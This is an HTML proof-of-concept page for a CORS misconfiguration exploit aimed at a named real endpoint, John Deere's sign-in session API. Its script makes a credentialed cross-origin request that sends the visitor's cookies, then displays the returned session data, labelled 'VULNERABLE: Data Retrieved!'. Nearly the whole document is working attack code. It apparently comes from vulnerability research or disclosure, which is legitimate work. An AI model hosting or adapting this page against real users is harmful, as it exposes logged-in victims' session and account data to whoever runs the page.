<!DOCTYPE html>
<html>
<head>
    <title>CORS Data Leakage PoC</title>
    <style>
        body { font-family: sans-serif; padding: 20px; }
        #result-box { background: #f4f4f4; padding: 15px; border: 1px solid #ccc; margin-top: 10px; overflow-x: auto; }
        .success { color: red; font-weight: bold; }
        .fail { color: green; font-weight: bold; }
    </style>
</head>
<body>
    <h2>CORS Exploit PoC: John Deere Session Leak</h2>
    <p>Target: <code>https://signin.johndeere.com/api/v1/sessions/me</code></p>
   
    <button onclick="exploit()">Trigger Exploit</button>
   
    <h3>Status: <span id="status">Idle</span></h3>
    <div id="result-box">
        <strong>Response Data:</strong>
        <pre id="response">Waiting for trigger...</pre>
    </div>

    <script>
        function exploit() {
            const status = document.getElementById("status");
            const responseBox = document.getElementById("response");
           
            status.innerText = "Sending Authenticated Request...";

            // 'credentials: include' is key here - it instructs the browser
            // to send the user's cookies (idx, JSESSIONID, etc.) with the request.
            fetch("https://signin.johndeere.com/api/v1/sessions/me", {
                method: "GET",
                mode: "cors",
                credentials: "include"
            })
            .then(response => {
                if (response.ok) {
                    status.innerHTML = "<span class='success'>VULNERABLE: Data Retrieved!</span>";
                    return response.json();
                } else {
                    status.innerHTML = "<span class='fail'>HTTP Error: " + response.status + "</span>";
                    return response.text();
                }
            })
            .then(data => {
                responseBox.innerText = JSON.stringify(data, null, 2);
            })
            .catch(error => {
                status.innerHTML = "<span class='fail'>SECURE: Blocked by Browser CORS Policy</span>";
                responseBox.innerText = "The browser blocked the read. Error details:\n" + error;
                console.error("CORS Error:", error);
            });
        }
    </script>
</body>
</html>
